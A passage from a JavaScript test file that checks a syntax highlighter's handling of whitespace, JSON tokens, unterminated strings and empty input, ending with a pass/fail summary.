    assert.ok(highlightJavaScript('a\n  b\r\nc\t!').includes('\n  b\r\nc\t!'));
});

test('highlightJavaScript: JSON documents highlight via the JS tokenizer', () => {
    const html = highlightJavaScript('{ "key": [1, null], "n": -2.5e1 }');
    assert.match(html, /<span class="jai-tok-string">"key"<\/span>/);
    assert.match(html, /<span class="jai-tok-number">1<\/span>/);
    assert.match(html, /<span class="jai-tok-literal">null<\/span>/);
    assert.match(html, /<span class="jai-tok-number">2.5e1<\/span>/);
});

test('highlightJavaScript: unterminated string stops at line end', () => {
    const html = highlightJavaScript("const a = 'open\nconst b = 2;");
    assert.match(html, /<span class="jai-tok-string">'open<\/span>/);
    assert.match(html, /jai-tok-keyword">const<\/span>/);
});

test('highlightJavaScript: empty/undefined input', () => {
    assert.equal(highlightJavaScript(''), '');
    assert.equal(highlightJavaScript(undefined), '');
});

await Promise.all(pendingAsyncTests);

console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
